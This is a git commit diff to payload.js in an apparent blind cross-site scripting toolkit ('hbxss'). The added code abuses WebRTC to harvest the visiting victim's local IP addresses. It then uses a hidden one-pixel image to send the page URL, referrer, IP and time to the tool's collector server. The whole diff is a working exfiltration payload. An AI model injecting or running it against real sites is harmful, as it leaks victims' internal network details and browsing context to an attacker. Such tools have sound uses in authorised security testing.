e28b99fea01fa30ec223a18d35050138b2bcdbe1
HAHWUL <hahwul@gmail.com>
2017-11-22 20:59:37 +0900

    update

--- hbxss/public/payload.js
+++ hbxss/public/payload.js
@@ -1,4 +1,42 @@
+function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
+    //compatibility for firefox and chrome
+    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+    var pc = new myPeerConnection({
+        iceServers: []
+    }),
+    noop = function() {},
+    localIPs = {},
+    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+    key;
 
+    function iterateIP(ip) {
+        if (!localIPs[ip]) onNewIP(ip);
+        localIPs[ip] = true;
+    }
+
+     //create a bogus data channel
+    pc.createDataChannel("");
+
+    // create offer and set local description
+    pc.createOffer().then(function(sdp) {
+        sdp.sdp.split('\n').forEach(function(line) {
+            if (line.indexOf('candidate') < 0) return;
+            line.match(ipRegex).forEach(iterateIP);
+        });
+        
+        pc.setLocalDescription(sdp, noop, noop);
+    }).catch(function(reason) {
+        // An error occurred, so handle the failure to connect
+    });
+
+    //listen for candidate events
+    pc.onicecandidate = function(ice) {
+        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+        ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+    };
+}
+
+getUserIP(function(ip){
 
 var pid = document.getElementById('hbxss');
 var domain = pid.src.split("/payload.js");
@@ -8,11 +46,8 @@ var key = pid.className;
 var url = document.location.href;
 var referer = document.referrer;
 var now = new Date();
-var ip = "";
 
 document.write("<img/src="+domain+"/logs/new?key="+key+"&url="+url+"&referer="+referer+"&ip="+ip+"&time="+now.toTimeString()+" style='width:1px;height:1px;'>");
 
-
-
-
+});
 
